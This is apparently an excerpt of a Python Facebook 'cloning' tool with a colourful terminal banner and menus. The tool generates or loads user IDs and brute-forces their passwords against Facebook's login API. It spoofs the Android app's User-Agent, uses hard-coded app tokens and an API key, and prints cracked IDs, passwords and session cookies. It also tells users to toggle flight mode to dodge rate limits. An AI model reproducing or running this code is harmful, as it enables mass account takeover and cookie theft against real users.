...
print('\033[1;91m[\033[1;92m●\033[1;91m] \033[1;92m𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝙼𝚈 𝚃𝙾𝙾𝙻𝚂')
os.system('espeak -a 300 " WELCOME TO MY TOOLS,"')
...
print('\033[1;91m[\033[1;92m●\033[1;91m] \033[1;92m𝙷𝚒 𝙸 𝙰𝙼 𝙰𝚃𝙸𝙺 𝙰𝙽𝙳 𝚈𝙾𝚄?')
...
if bit == '64bit':
 print('\033[1;91m[\033[1;92m●\033[1;91m] \033[1;92m𝚈𝙾𝚄 𝙰𝚁𝙴 64𝙱𝙸𝚃 𝚄𝚂𝙴𝚁')
elif bit == '32bit':
 print('\033[1;91m[\033[1;92m●\033[1;91m] \033[1;92m𝚈𝙾𝚄 𝙰𝚁𝙴 32𝙱𝙸𝚃 𝚄𝚂𝙴𝚁')
...
\033[1;36m╚═╝ ╚═╝       ╚═╝       ╚═╝    ╚═╝  ╚═╝
\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m 𝙰𝚄𝚃𝙷𝙾𝚁     ● 𝙳𝙰𝙱𝙸𝚃 𝚂𝚄𝙻𝚃𝙰𝙽 𝙰𝚃𝙸𝙺
\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺   \x1b[1;92m● \x1b[1;92m𝙳𝙰𝙱𝙸𝚃 𝚂𝚄𝙻𝚃𝙰𝙽 𝙰𝚃𝙸𝙺
\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m\x1b[1;92m Version    ● \033[1;32m1.1\033[1;32m
\033[1;91m[\033[1;92m=\033[1;91m]\033[1;92m\x1b[1;92m 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿   ● +8801608032030
\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def menu():
        try:
              #  approval()
                        clear()
                        print(f'{G}[{A}1{G}]{G} 𝙵𝙸𝙻𝙴 𝙲𝙻𝙾𝙽𝙴 \n{G}[{A}2{G}]{G} 𝚁𝙰𝙽𝙳𝙾𝙼 𝙲𝙻𝙾𝙽𝙸𝙽𝙶\n{G}[{A}3{G}]{G} 𝙰𝙳𝙼𝙸𝙽 𝙰𝚃𝙸𝙺\n{G}[{A}0{G}]{G} 𝙴𝚇𝙸𝚃 𝚃𝙾𝙾𝙻')
                        linex()
                        xd=input(f'{G}[{A}?{G}]{A} 𝙲𝙷𝙾𝙸𝙲𝙴 : ')
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print(f'{G}[{A}1{G}]{G} 𝙼𝙴𝚃𝙷𝙾𝙳 {G}[{A}M1{G}]\n{G}[{A}2{G}]{G} 𝙼𝙴𝚃𝙷𝙾𝙳 {G}[{A}M2{G}]\n{G}[{A}3{G}]{G} 𝙼𝙴𝚃𝙷𝙾𝙳 {G}[{A}M3{G}]\n{G}[{A}4{G}]{G} 𝙼𝙴𝚃𝙷𝙾𝙳 {G}[{A}M4{G}]');linex()
                                mthd=input(f'{G}[{A}?{G}]{G} CHOICE : ')
                                clear()
                                plist = []
                                print(f'           𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳');linex();print(f'{G}[{A}1{G}]{G} 𝙲𝙷𝙾𝙸𝙲𝙴 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 𝙲𝙻𝙾𝙽𝙴\n{G}[{A}2{G}]{G} 𝙰𝚄𝚃𝙾 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 𝙲𝙻𝙾𝙽𝙴');linex()
                                ppp=input(f'{G}[{A}?{G}]{G} 𝙲𝙷𝙾𝙸𝙲𝙴 : ')
                                if ppp in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(f'\033[1;32m[\033[1;31m●\033[1;32m] 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳𝚂  :{A} '+total_ids+f' {G}<{A}-{G}> 𝙼𝙴𝚃𝙷𝙾𝙳 :{A} M{mthd}')
                                        print(f'\033[1;32m[\033[1;31m●\033[1;32m] 𝙿𝙻𝙴𝙰𝚂𝙴 𝙴𝚅𝙴𝚁𝚈 5 𝙼𝙸𝙽 [𝙾𝙽/𝙾𝙵] 𝚈𝙾𝚄𝚁 𝙵𝙻𝙸𝙶𝙷𝚃 𝙼𝙾𝙳𝙴')
                                        linex()
                                        for user in fo:
...
def afghanistan():
		...
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} 𝙼𝙴𝚃𝙷𝙾𝙳 {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} 𝙼𝙴𝚃𝙷𝙾𝙳 {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} 𝙼𝙴𝚃𝙷𝙾𝙳 {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
...
def api1(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{G}[{R}𝚇𝙲-𝙼1{G}]{G} %s {G}●{G} OK{G} ● {G}CP{G} %s{G} ● {R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"api_key": "882a8490361da98702bf97a021ddc14d"}                         
                        headers={'User-Agent': "[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/Airtel;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
...
'Connection': 'Keep-Alive',}
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}𝚇𝙲-𝙼1-💚{G}]{G} '+ids+f' ● '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}𝚇𝙲-𝙼1-😴{G}]{Y} '+ids+' ● '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{G}[{R}𝚇𝙲-𝙼2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
                        headers = {"User-Agent": "[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/Grameenphone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"Accept-Encoding":"gzip, deflate",
"Connection":"keep-alive",
"Content-Type":"application/x-www-form-urlencoded",
"Host":"graph.facebook.com",
...
"x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}𝚇𝙲-𝙼2-💚{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
...
def api3(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{G}[{R}𝚇𝙲-𝙼3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def rndm1(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}𝚇𝙲-𝙼4{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
